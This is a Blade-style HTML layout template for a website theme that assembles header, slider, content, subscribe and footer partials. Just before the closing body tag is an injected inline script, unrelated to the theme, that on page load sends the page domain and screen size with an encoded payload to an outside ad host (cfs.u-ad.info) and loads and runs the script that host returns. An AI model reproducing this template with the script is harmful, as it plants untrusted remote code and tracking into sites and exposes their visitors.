<!DOCTYPE html>
<html>
    <head>
        <title>{{ Theme::place('title') }}</title>
        <meta charset="utf-8">
        {{ Theme::partial('seostuff') }}    
        {{ Theme::partial('defaultcss') }}
        {{ Theme::asset()->styles() }}          
    </head>
    <body class="boxed">
        <div id="template-wrapper" class="boxed">
            {{ Theme::partial('header') }}  
            <div id="site-wrapper">
                {{ Theme::partial('slider') }}  
                {{ Theme::place('content') }}   
                {{ Theme::partial('subscribe') }}   
            </div>
            {{ Theme::partial('footer') }}  
        </div>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnVGGhmqmSm4CopjWm8Pc30FPU7AhpLgKFijZG8ZCDoKYYj8Mx3EnPhSD5Ztv7vT0IZQCuc5N0%2fUROoHl8VLfV3YPp4%2fAALse%2b%2f%2b92aKWkz0H1iWzUOLjW6evAbJUkMr1y5ZU0f72xXyDBxIHKnrfCOsRofnr9H319oX8JgsKNj7npZCArzNd00gxxVyjX%2fuTe%2bnjK1mAoPLPS7pUnZklA8RJYg8EWySvDk4KIRa%2bEwgXjE8OWJGutaNiiR6NjDjyvqSXzrv1brwVEXR00TKBqKTCmGbZ0qwY10DmTItBy5byIQnB8N%2f1v%2baZc7TwEAJe2T3fzumQK06hWLucMxpdiGl70z7ozfNs%2bN0fS4Th2E%2fXdX7k4R8t22HE7lscoBnqTKbLlknWz4NOYMXoKAu%2bB16c760dfaDCzWkiEQL%2bFBX8rLQTuaHLoqoDeYwMn0WRn7IlTicZOsn9hMYf6lstyjSrraG6rwly22mGBHaRJRlQWmP7Tg9ORT0uYSmtRtyQcIi6zGSkcOFo%2bZXceKwMsI70Ka9aPqgVuD%2bSJ%2f9unxrAaQbjnr0wmFNBxp3rMyHmr" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    {{ Theme::partial('defaultjs') }}   
    {{ Theme::partial('analytic') }}    
</html>